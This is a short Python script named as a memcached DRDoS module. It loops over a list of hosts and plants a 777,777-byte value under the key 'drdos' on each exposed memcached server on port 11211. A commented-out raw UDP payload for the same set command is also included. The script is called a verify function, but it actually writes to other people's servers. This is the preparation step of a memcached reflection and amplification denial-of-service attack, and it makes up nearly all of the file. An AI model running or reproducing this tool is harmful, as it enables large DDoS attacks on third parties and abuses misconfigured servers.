# -*- coding: utf-8 -*-
# @Author  : "L_AnG"
# @Time    : 2018/3/2 16:00
# @File    : memcached_drdos_module.py

import socket
import sys
import memcache
    
def verify(host, paydata):

    result = ''
   # payload = ("\x00\x00\x00\x00\x00\x01\x00\x00set drdos 0 0 %s\r\n%s\r\n") % (len(paydata), paydata)
    
    try: 

#        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#        s.settimeout(2)
#        s.sendto(payload, (host, 11211))

#        data = s.recvfrom(1024)
        mc = memcache.Client([host+":11211"], debug=True)
        mc.set("drdos", paydata)
#        print(data)
#        if data:
#            result= u"{ip}".format(
#                ip=host
#            )

        return result
    except socket.timeout:
        return result

    
if __name__ == '__main__':
    data = 'a'* 777777
    with open('memcache.list') as file:
        for line in file:
            re = verify(line.rstrip('\n'), data)
